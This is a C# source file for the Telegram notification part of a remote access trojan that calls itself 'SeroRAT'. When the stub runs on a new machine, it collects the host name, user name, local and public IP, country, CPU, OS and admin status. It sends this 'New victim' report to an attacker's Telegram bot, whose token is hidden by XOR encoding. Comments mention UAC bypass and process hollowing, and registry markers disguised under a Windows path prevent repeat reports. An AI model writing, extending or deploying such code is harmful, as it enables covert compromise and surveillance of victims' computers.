using System.Net.Http;
using System.Text;
using Microsoft.Win32;

namespace SeroStub;

// Sends a one-shot Telegram message when this stub runs on a new machine.
// Token and chat IDs are XOR-encoded in Config — never stored as plaintext.
internal static class TelegramNotifier
{
    // HWID-based flag: same machine never re-notifies even across new builds.
    // UserName intentionally excluded — HWID must be identical when stub restarts
    // under a different user context (e.g. SYSTEM → user after UAC bypass relaunch).
    private static string GetHwidShort()
    {
        var raw = $"{Environment.MachineName}:{Environment.ProcessorCount}";
        var hash = System.Security.Cryptography.SHA256.HashData(Encoding.UTF8.GetBytes(raw));
        return Convert.ToHexString(hash)[..12].ToLower();
    }

    private static readonly string _flagKey =
        $@"SOFTWARE\Microsoft\Windows\CurrentVersion\{Config.PersistName}_tg_{GetHwidShort()}";

    private static bool ShouldNotify()
    {
        // Check HKLM first — machine-wide, survives SYSTEM→user context changes
        try
        {
            using var k = Registry.LocalMachine.OpenSubKey(_flagKey, false);
            if (k != null) return false;
        }
        catch { }
        // Fallback: HKCU of current user
        try
        {
            using var k = Registry.CurrentUser.OpenSubKey(_flagKey, false);
            if (k != null) return false;
        }
        catch { }
        return true;
    }

    // Global counter key — no BuildId so it increments across all builds
    private static readonly string _counterKey =
        $@"SOFTWARE\Microsoft\Windows\CurrentVersion\{Config.PersistName}_tg_count";

    private static int IncrementAndGetCount()
    {
        // Try HKLM first (machine-wide, survives user context changes from hollowing)
        // Fall back to HKCU if not admin
        RegistryKey? k = null;
        try { k = Registry.LocalMachine.CreateSubKey(_counterKey); } catch { }
        if (k == null)
            try { k = Registry.CurrentUser.CreateSubKey(_counterKey); } catch { }
        try
        {
            if (k == null) return 1;
            using (k)
            {
                int current = int.TryParse(k.GetValue("n")?.ToString(), out int n) ? n : 0;
                int next = current + 1;
                k.SetValue("n", next.ToString());
                return next;
            }
        }
        catch { return 1; }
    }

    private static void MarkNotified()
    {
        // Write to HKLM first (machine-wide — persists across user context changes)
        try
        {
            using var k = Registry.LocalMachine.CreateSubKey(_flagKey);
            k?.SetValue("ts", DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString());
            return;
        }
        catch { }
        // Fallback: HKCU
        try
        {
            using var k = Registry.CurrentUser.CreateSubKey(_flagKey);
            k?.SetValue("ts", DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString());
        }
        catch { }
    }

    private static string DecodeXor(byte[] data, byte[] key)
    {
        if (data.Length == 0) return "";
        var buf = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            buf[i] = (byte)(data[i] ^ key[i % key.Length]);
        return Encoding.UTF8.GetString(buf);
    }

    private static string GetCpuName()
    {
        try
        {
            using var k = Registry.LocalMachine.OpenSubKey(
                @"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
            return k?.GetValue("ProcessorNameString")?.ToString()?.Trim() ?? "Unknown";
        }
        catch { return "Unknown"; }
    }

    private static string GetOsName()
    {
        try
        {
            using var k = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            var prod  = k?.GetValue("ProductName")?.ToString() ?? "Windows";
            var build = k?.GetValue("CurrentBuildNumber")?.ToString() ?? "";
            // Registry still says "Windows 10" on Windows 11 — fix by build number
            if (int.TryParse(build, out int bn) && bn >= 22000)
                prod = prod.Replace("Windows 10", "Windows 11");
            return string.IsNullOrEmpty(build) ? prod : $"{prod} (build {build})";
        }
        catch { return "Windows"; }
    }

    // Returns (publicIp, country) using ip-api.com (free, no key needed)
    private static async Task<(string ip, string country)> GetPublicInfoAsync(HttpClient http)
    {
        try
        {
            var json = await http.GetStringAsync("http://ip-api.com/json/?fields=query,country");
            var doc  = System.Text.Json.JsonDocument.Parse(json);
            var ip      = doc.RootElement.TryGetProperty("query",   out var q) ? q.GetString() ?? "N/A" : "N/A";
            var country = doc.RootElement.TryGetProperty("country", out var c) ? c.GetString() ?? "N/A" : "N/A";
            return (ip, country);
        }
        catch { return ("N/A", "N/A"); }
    }

    private static bool IsAdmin()
    {
        try
        {
            using var id = System.Security.Principal.WindowsIdentity.GetCurrent();
            return new System.Security.Principal.WindowsPrincipal(id)
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    private static string GetLocalIp()
    {
        try
        {
            foreach (var iface in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
            {
                if (iface.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue;
                foreach (var addr in iface.GetIPProperties().UnicastAddresses)
                {
                    if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork
                        && !System.Net.IPAddress.IsLoopback(addr.Address))
                        return addr.Address.ToString();
                }
            }
        }
        catch { }
        return "N/A";
    }

    public static void NotifyAsync()
    {
        if (!Config.TelegramEnabled) return;
        if (!ShouldNotify()) return;

        var token   = DecodeXor(Config.TelegramTokenXor,   Config.TelegramXorKey);
        var chatId1 = DecodeXor(Config.TelegramChatId1Xor, Config.TelegramXorKey);
        var chatId2 = DecodeXor(Config.TelegramChatId2Xor, Config.TelegramXorKey);

        if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1)) return;

        var targets = new List<string> { chatId1 };
        if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);

        Task.Run(async () =>
        {
            try
            {
                await Task.Delay(500);
                using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(12) };
                http.DefaultRequestHeaders.UserAgent.ParseAdd(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                var (pubIp, country) = await GetPublicInfoAsync(http);
                var count = IncrementAndGetCount();
                var msg = BuildMessage(pubIp, country, count);

                bool primarySent = false;
                for (int attempt = 0; attempt < 3 && !primarySent; attempt++)
                {
                    try
                    {
                        if (attempt > 0) await Task.Delay(4000);
                        await SendMessage(http, token, targets[0], msg);
                        primarySent = true;
                        MarkNotified();
                        for (int i = 1; i < targets.Count; i++)
                        {
                            try { await SendMessage(http, token, targets[i], msg); } catch { }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        });
    }

    private static string BuildMessage(string pubIp, string country, int count)
    {
        var prefix   = string.IsNullOrEmpty(Config.ClientIdPrefix) ? "" : $"{Config.ClientIdPrefix}-";
        var clientId = $"{prefix}{Environment.MachineName}";
        var admin    = IsAdmin() ? "Yes" : "No";
        var parisTz  = TimeZoneInfo.FindSystemTimeZoneById("Romance Standard Time");
        var paris    = TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow, parisTz);
        var dt       = paris.ToString("yyyy-MM-dd HH:mm") + " (Paris)";

        return
            $"New victim {ToOrdinal(count)} - SeroRAT\n" +
            $"\n" +
            $"ID: {clientId}\n" +
            $"User: {Environment.UserName}@{Environment.MachineName}\n" +
            $"Local IP: {GetLocalIp()}\n" +
            $"Public IP: {pubIp}\n" +
            $"Country: {country}\n" +
            $"CPU: {GetCpuName()}\n" +
            $"OS: {GetOsName()}\n" +
            $"Admin: {admin}\n" +
            $"Time: {dt}";
    }

    private static string ToOrdinal(int n)
    {
        string suffix = (n % 100) switch
        {
            11 or 12 or 13 => "th",
            _ => (n % 10) switch { 1 => "st", 2 => "nd", 3 => "rd", _ => "th" }
        };
        return $"{n}{suffix}";
    }

    // GET request with URL-encoded plain text — no parse_mode, no markdown, no 400 errors
    private static async Task SendMessage(HttpClient http, string token, string chatId, string text)
    {
        var url = $"https://api.telegram.org/bot{token}/sendMessage" +
                  $"?chat_id={Uri.EscapeDataString(chatId)}" +
                  $"&text={Uri.EscapeDataString(text)}";
        await http.GetAsync(url);
    }
}
